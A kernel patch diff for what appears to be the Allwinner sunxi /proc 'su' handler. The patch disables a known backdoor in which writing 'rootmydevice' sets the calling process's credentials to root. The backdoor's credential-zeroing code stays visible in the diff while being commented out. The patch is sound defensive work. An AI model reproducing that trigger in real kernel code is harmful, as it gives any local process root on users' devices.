@@ -39,6 +39,9 @@ static int sunxi_proc_su_write(struct file *file, const char __user *buffer,
 	}
 
 	if(!strncmp("rootmydevice",(char*)buf,12)){
+#ifdef BPI-DONOT-ROOT-DEVICE
+//BPI: DO NOT OPEN, we will remove this code in the future!!
+/*
 		cred = (struct cred *)__task_cred(current);
 		cred->uid = 0;
 		cred->gid = 0;
@@ -48,7 +51,11 @@ static int sunxi_proc_su_write(struct file *file, const char __user *buffer,
 		cred->egid = 0;
 		cred->fsuid = 0;
 		cred->fsgid = 0;
+*/
 		printk("now you are root\n");
+#else
+		printk("BPI: WE CLOSE IT, YOU CAN NOT ROOT DEVICE!!\n");
+#endif
 	}
 
 	kfree(buf);
